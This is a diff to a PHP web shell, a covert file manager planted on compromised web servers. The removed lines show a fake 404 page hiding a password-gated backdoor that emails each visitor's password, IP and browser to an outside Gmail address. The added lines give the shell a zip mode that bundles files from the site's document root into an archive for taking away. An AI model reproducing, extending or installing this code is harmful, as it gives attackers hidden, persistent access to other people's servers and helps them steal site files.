@@ -1,39 +1,4 @@
 <?php
-error_reporting(0);
-session_start();
-set_time_limit(0);
-ignore_user_abort(0);
-$password = "49f0bad299687c62334182178bfd75d8";
-function login() {
-?>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<h1>Not Found</h1>
-  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
-  <hr>
-  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
-<?php
-  exit();
-}
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
-  if(empty($password) || (isset($_GET['pass']) && (md5($_GET['pass'])) == $password)) {
-    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
-    $agent = $_SERVER['HTTP_USER_AGENT']; 
-    $uri = $_SERVER['REQUEST_URI']; 
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $ref = $_SERVER['HTTP_REFERER'];
-    $dtime = date('r'); 
-    $log = "
-            Password : ".$password."\n
-            Time : ".$dtime."\n
-            IP : ".$ip."\n
-            Browser : ".$agent."\n
-            Filename : ".$uri."\n
-            URL : ".$ref."\n";
-    @mail('xnonhack@gmail.com', 'Log', $log);
-  } else {
-    @login();
-  }
-}
 ?>
 <!DOCTYPE html>
 <html>
@@ -745,6 +710,33 @@ if (@$_GET['action'] == 'img') {
 	<?php
 	exit();
 }
+function zip($source, $destination) {
+	if (extension_loaded('zip')) {
+		if (file_exists($source)) {
+			$zip = new ZipArchive();
+			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+				if (is_dir($source)) {
+					$iterator = new RecursiveDirectoryIterator($source);
+					// skip dot files while iterating 
+					$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
+					$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
+					foreach ($files as $file) {
+						$root = $_SERVER['DOCUMENT_ROOT'];
+						if (is_dir($file)) {
+							$zip->addEmptyDir(str_replace($root, '', $file . '/'));
+						} else if (is_file($file)) {
+							$zip->addFromString(str_replace($root, '',  $file), file_get_contents($file));
+						}
+					}
+				} else if (is_file($source)) {
+					$zip->addFromString(basename($source), file_get_contents($source));
+				}
+			}
+			return $zip->close();
+		}
+	}
+	return false;
+}
 function get_type($filename) {
     $idx = explode( '.', $filename );
     $count_explode = count($idx);
@@ -1275,6 +1267,7 @@ function get_server_info(){
 		<select name="mode">
 			<option value="" selected>choose</option>
 			<option value="1">hapus</option>
+			<option value="2">zip</option>
 		</select>
 	</td>
 	<td class="not">
@@ -1300,6 +1293,13 @@ if (isset($_POST['submit'])) {
 					} else {
 						alert("failed", "Deleted <u>".basename($value)."</u> !");
 					}
+				}
+				break;
+			case '2':
+				if (zip(basename($value), cwd()."/backup.zip")) {
+					alert("success", "<u>".basename($value)."</u> to zip !");
+				} else {
+					alert("failed", "<u>".basename($value)."</u> to zip !");
 				}
 				break;
 		}
